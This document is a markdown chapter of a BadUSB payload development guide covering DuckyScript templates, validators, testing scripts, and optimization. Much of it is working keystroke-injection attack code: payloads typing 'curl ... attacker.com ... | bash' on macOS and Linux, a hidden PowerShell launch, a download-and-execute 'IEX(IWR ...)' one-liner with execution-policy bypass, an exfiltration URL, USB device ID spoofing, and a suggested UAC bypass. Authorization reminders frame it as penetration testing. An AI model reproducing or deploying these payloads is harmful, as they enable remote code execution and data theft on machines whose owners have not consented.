# BadUSB Payload Development Guide

## Overview

This guide covers the complete payload development lifecycle from concept to deployment, including testing, debugging, and optimization.

---

## Development Workflow

```
PAYLOAD DEVELOPMENT LIFECYCLE

  ┌─────────────┐
  │   CONCEPT   │  What do you want to accomplish?
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │   DESIGN    │  Plan the steps and commands
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │   DEVELOP   │  Write the DuckyScript
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │    TEST     │  Test on your own systems
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │   DEBUG     │  Fix issues and optimize
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │  DOCUMENT   │  Add comments and metadata
  └──────┬──────┘
         ▼
  ┌─────────────┐
  │   DEPLOY    │  Use for authorized testing
  └─────────────┘
```

---

## Payload Structure

### Standard Template

```
REM =============================================
REM Payload Name: [Descriptive Name]
REM Version: 1.0
REM Author: [Your Name]
REM Target: [Windows 10/11, macOS, Linux]
REM Description:
REM   [What does this payload do?]
REM   [Expected outcome]
REM
REM MITRE ATT&CK: [Technique IDs if applicable]
REM =============================================
REM Requirements:
REM   - [List any requirements]
REM   - [e.g., Admin access, specific software]
REM =============================================
REM Changelog:
REM   v1.0 - Initial version
REM =============================================

REM === INITIALIZATION ===
DELAY 2000

REM === MAIN PAYLOAD ===
[Your commands here]

REM === CLEANUP (Optional) ===
[Cleanup commands here]

REM === END ===
```

### Minimal Template

```
REM [Payload Name] - [Brief Description]
REM Target: [OS]

DELAY 2000
[Commands]
```

---

## Development Environment

### Local Testing Setup

```bash
#!/bin/bash
#######################################
# Payload Development Environment Setup
#######################################

DEV_DIR="$HOME/badusb_dev"
mkdir -p "$DEV_DIR"/{payloads,test_results,templates}

# Create payload template
cat > "$DEV_DIR/templates/payload_template.txt" << 'EOF'
REM =============================================
REM Payload Name: TEMPLATE
REM Version: 1.0
REM Author: YOUR_NAME
REM Target: Windows 10/11
REM Description: [Description here]
REM =============================================

DELAY 2000

REM === YOUR PAYLOAD HERE ===

EOF

# Create test logging script
cat > "$DEV_DIR/test_results/log_test.sh" << 'EOF'
#!/bin/bash
PAYLOAD="$1"
RESULT="$2"
echo "$(date '+%Y-%m-%d %H:%M:%S') | $PAYLOAD | $RESULT" >> test_log.txt
EOF
chmod +x "$DEV_DIR/test_results/log_test.sh"

echo "[+] Development environment created: $DEV_DIR"
```

### Payload Validation Script

```bash
#!/bin/bash
#######################################
# DuckyScript Payload Validator
# Check for common syntax issues
#######################################

PAYLOAD="$1"

if [ -z "$PAYLOAD" ]; then
    echo "Usage: $0 <payload.txt>"
    exit 1
fi

echo "[*] Validating: $PAYLOAD"
echo ""

ERRORS=0
WARNINGS=0

# Check for required initial delay
if ! head -20 "$PAYLOAD" | grep -q "DELAY"; then
    echo "[WARN] No initial DELAY found in first 20 lines"
    ((WARNINGS++))
fi

# Check for unknown commands
VALID_COMMANDS="REM DELAY STRING STRINGLN ENTER GUI WINDOWS CTRL ALT SHIFT TAB ESCAPE ESC SPACE BACKSPACE DELETE INSERT HOME END PAGEUP PAGEDOWN UP DOWN LEFT RIGHT F1 F2 F3 F4 F5 F6 F7 F8 F9 F10 F11 F12 CAPSLOCK NUMLOCK SCROLLLOCK PRINTSCREEN PAUSE BREAK APP MENU WAIT REPEAT SYSRQ DEFAULT_DELAY DEFAULTDELAY ATTACKMODE ID LED"

while IFS= read -r line; do
    # Skip empty lines and comments
    [[ -z "$line" || "$line" =~ ^[[:space:]]*REM ]] && continue

    CMD=$(echo "$line" | awk '{print $1}')

    if ! echo "$VALID_COMMANDS" | grep -qw "$CMD"; then
        echo "[ERROR] Unknown command: $CMD"
        echo "        Line: $line"
        ((ERRORS++))
    fi
done < "$PAYLOAD"

# Check for balanced quotes in STRING commands
grep "^STRING" "$PAYLOAD" | while read line; do
    QUOTES=$(echo "$line" | tr -cd '"' | wc -c)
    if [ $((QUOTES % 2)) -ne 0 ]; then
        echo "[WARN] Unbalanced quotes: $line"
        ((WARNINGS++))
    fi
done

# Check for very short delays
grep "^DELAY" "$PAYLOAD" | while read line; do
    DELAY_VAL=$(echo "$line" | awk '{print $2}')
    if [ "$DELAY_VAL" -lt 100 ] 2>/dev/null; then
        echo "[WARN] Very short delay ($DELAY_VAL ms): $line"
    fi
done

echo ""
echo "Validation complete: $ERRORS errors, $WARNINGS warnings"

if [ $ERRORS -gt 0 ]; then
    exit 1
fi
```

---

## Advanced DuckyScript Features

### Variables and Defines

```
REM Define commonly used values
DEFINE WAIT_SHORT 500
DEFINE WAIT_LONG 2000
DEFINE EXFIL_URL http://192.168.1.100:8080

REM Use defined values
DELAY #WAIT_LONG
STRING curl #EXFIL_URL/collect
```

### Conditional Execution

```
REM Check if caps lock is on
LED_R
DELAY 100
LED_OFF

REM Repeat commands
REPEAT 3
STRING test
ENTER
END_REPEAT
```

### Attack Modes

```
REM Change device type
ATTACKMODE HID
ATTACKMODE STORAGE
ATTACKMODE HID STORAGE

REM Device spoofing
ID 046D:C52B Logitech:Unifying Receiver
```

---

## Multi-OS Payload Development

### OS Detection Challenges

Since BadUSB can't detect the target OS, use these strategies:

### Strategy 1: OS-Specific Payloads

Create separate payloads for each OS:

```
payloads/
├── win_info_gather.txt
├── mac_info_gather.txt
└── linux_info_gather.txt
```

### Strategy 2: Universal Techniques

Use commands that work across multiple systems:

```
REM Universal browser open (via keyboard shortcut)
DELAY 2000
CTRL l
DELAY 200
STRING https://attacker.com/beacon
ENTER
```

### Strategy 3: Attempted All

Try multiple methods and rely on errors being silent:

```
REM Try Windows first
GUI r
DELAY 500
STRING powershell -w hidden -c "..."
ENTER
DELAY 3000

REM Try macOS
GUI SPACE
DELAY 500
STRING terminal
ENTER
DELAY 1000
STRING curl -s http://attacker.com/mac | bash
ENTER
DELAY 3000

REM Try Linux
CTRL ALT t
DELAY 500
STRING curl -s http://attacker.com/linux | bash
ENTER
```

---

## Testing Methodology

### Test Matrix

| Test Case | Windows 10 | Windows 11 | macOS | Linux |
|-----------|------------|------------|-------|-------|
| Initial delay | ✓ | ✓ | ✓ | ✓ |
| Run dialog | ✓ | ✓ | N/A | N/A |
| Terminal open | N/A | N/A | ✓ | ✓ |
| Payload execution | ? | ? | ? | ? |
| Cleanup | ? | ? | ? | ? |

### Test Execution Script

```bash
#!/bin/bash
#######################################
# Payload Test Execution
# Run on target VM
#######################################

TEST_ID="${1:-test_$(date +%Y%m%d_%H%M%S)}"
LOG_DIR="/tmp/payload_tests/$TEST_ID"

mkdir -p "$LOG_DIR"

echo "[*] Payload Test: $TEST_ID"
echo "[*] Logging to: $LOG_DIR"
echo ""

# Pre-test snapshot
echo "[*] Capturing pre-test state..."
ps aux > "$LOG_DIR/processes_before.txt"
ss -tulpn > "$LOG_DIR/network_before.txt"
crontab -l > "$LOG_DIR/cron_before.txt" 2>/dev/null

echo "[*] Ready for payload deployment"
echo "[*] Press Enter after payload completes..."
read

# Post-test snapshot
echo "[*] Capturing post-test state..."
ps aux > "$LOG_DIR/processes_after.txt"
ss -tulpn > "$LOG_DIR/network_after.txt"
crontab -l > "$LOG_DIR/cron_after.txt" 2>/dev/null

# Compare
echo ""
echo "[*] Changes detected:"
echo "=== New Processes ==="
diff "$LOG_DIR/processes_before.txt" "$LOG_DIR/processes_after.txt" | grep "^>" | head -10

echo ""
echo "=== New Network ==="
diff "$LOG_DIR/network_before.txt" "$LOG_DIR/network_after.txt" | grep "^>" | head -10

echo ""
echo "=== Cron Changes ==="
diff "$LOG_DIR/cron_before.txt" "$LOG_DIR/cron_after.txt" 2>/dev/null

echo ""
echo "[*] Full logs saved to: $LOG_DIR"
```

---

## Debugging Techniques

### Common Issues and Fixes

| Issue | Diagnosis | Fix |
|-------|-----------|-----|
| Payload doesn't start | USB not recognized | Increase initial DELAY |
| Wrong characters typed | Keyboard layout mismatch | Add correct layout header |
| Commands appear literally | Target window not focused | Add DELAY after window open |
| Partial execution | Timing too fast | Increase DELAYs throughout |
| UAC blocks execution | Needs elevation | Add UAC bypass or avoid |

### Debug Mode Payload

```
REM Debug mode - shows each step
REM Remove LEDs and messages for production

DELAY 3000

REM Step 1: Open Run
LED_G
GUI r
DELAY 1000

REM Step 2: Type command
LED_B
STRING notepad
DELAY 500

REM Step 3: Execute
LED_R
ENTER
DELAY 2000

REM Step 4: Type test
STRING Debug successful!
LED_OFF
```

### Logging Payload Actions

```
REM Self-logging payload for debugging
DELAY 2000
GUI r
DELAY 500
STRING cmd /c echo %date% %time% - Payload started >> %TEMP%\debug.log
ENTER
DELAY 500

REM Your payload here...

GUI r
DELAY 500
STRING cmd /c echo %date% %time% - Payload complete >> %TEMP%\debug.log
ENTER
```

---

## Optimization

### Speed Optimization

```
REM Slow version
STRING powershell
DELAY 500
ENTER
DELAY 2000
STRING $host
DELAY 500
ENTER

REM Optimized version
STRING powershell -c "$host"
ENTER
```

### Reliability Optimization

```
REM Unreliable
GUI r
STRING cmd

REM More reliable
GUI r
DELAY 500
GUI r
DELAY 500
STRING cmd
DELAY 200
ENTER
```

### Size Optimization

```
REM Long version
STRING Set-ExecutionPolicy Bypass -Scope Process -Force
ENTER
STRING Invoke-WebRequest -Uri "http://example.com/script.ps1" -OutFile "$env:TEMP\s.ps1"
ENTER
STRING powershell -ep bypass -f "$env:TEMP\s.ps1"
ENTER

REM Short version
STRING powershell -ep bypass -c "IEX(IWR 'http://example.com/s.ps1')"
ENTER
```

---

## Best Practices

### Do's

1. ✅ Always include initial DELAY (2000ms+)
2. ✅ Comment your code thoroughly
3. ✅ Test on your own systems first
4. ✅ Use consistent naming conventions
5. ✅ Version your payloads
6. ✅ Document expected behavior
7. ✅ Include cleanup when appropriate

### Don'ts

1. ❌ Don't use on systems without permission
2. ❌ Don't rely on minimum delays
3. ❌ Don't assume keyboard layout
4. ❌ Don't ignore error conditions
5. ❌ Don't skip testing
6. ❌ Don't leave debug code in production

---

## Payload Checklist

```
BEFORE DEPLOYMENT:
☐ Payload validated with syntax checker
☐ Tested on matching OS version
☐ Timing adjusted for reliability
☐ Comments added for clarity
☐ Cleanup included if needed
☐ Detection considerations reviewed
☐ Written authorization obtained
☐ Emergency stop plan in place
```

---

[← Back to Chapter 01](../README.md)
